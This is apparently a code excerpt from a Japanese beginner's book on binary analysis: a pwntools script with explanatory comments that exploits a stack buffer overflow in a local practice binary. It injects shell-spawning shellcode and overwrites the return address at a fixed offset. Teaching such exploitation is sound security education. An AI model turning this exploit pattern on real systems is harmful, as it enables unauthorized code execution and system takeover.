# はじめて学ぶバイナリ解析 不正なコード型コンピュータを守るサイバーセキュリティ技術

from pwn import *

p = process("./a.out")

shellcode = asm(shellcraft.sh()) # シェルコードを作成
buffer_addr = int(p.recvline(), 16)
payload = shellcode + "A" * (140 - len(shellcode)) + p32(buffer_addr) # シェルコードにオフセットを追加

p.sendline(payload)
p.interactive()

# asm() = 送信したい処理のアセンブリコードを16進数に変換する
# shellcraft.sh() = シェルを呼び出すアセンブリコードを出力する関数
# int() = n進数で表現された数を整数へ変換する
